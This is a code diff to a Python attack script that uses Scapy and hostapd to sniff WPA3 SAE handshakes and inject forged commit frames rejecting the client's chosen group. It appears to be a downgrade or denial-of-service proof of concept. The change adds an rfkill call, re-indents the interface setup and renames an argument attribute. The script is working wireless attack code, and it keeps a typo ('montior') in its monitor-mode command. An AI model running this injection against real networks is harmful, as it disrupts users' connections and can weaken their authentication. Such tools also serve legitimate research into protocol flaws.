@@ -21,10 +21,11 @@ def set_up_hostapd(ssid, iface):
     time.sleep(1)
 
 def configure_interface(iface):
-    os.system("ifconfig " + iface + " down")
-    os.system("iwconfig " + iface + " mode montior")
-    os.system("ifconfig " + iface + " up")
-    os.system("iw " + iface + " set channel 1")
+	os.system("rfkill unblock wifi")
+	os.system("ifconfig " + iface + " down")
+	os.system("iwconfig " + iface + " mode montior")
+	os.system("ifconfig " + iface + " up")
+	os.system("iw " + iface + " set channel 1")
 
 def build_sae_commit_group_not_supported(srcaddr, dstaddr, group):
 	p = Dot11(addr1=dstaddr, addr2=srcaddr, addr3=dstaddr)
@@ -43,7 +44,7 @@ def handle_traffic(p):
 			group = get_sae_group(p)
 			print("Client is choosing group " + str(group) + ". Injecting commit frame rejecting the chosen group.")
 			commit = build_sae_commit_group_not_supported(apmac, p.addr2, group)
-			sendp(RadioTap()/commit, iface=args.interfaceInject)
+			sendp(RadioTap()/commit, iface=args.interface_inject)
 
 def cleanup():
 	if hostapd:
@@ -64,4 +65,4 @@ if __name__ == "__main__":
 	configure_interface(args.interface_inject)
 	set_up_hostapd(args.ssid, args.interface_AP)
 
-	sniff(iface=args.interfaceInject, prn=handle_traffic)
+	sniff(iface=args.interface_inject, prn=handle_traffic)
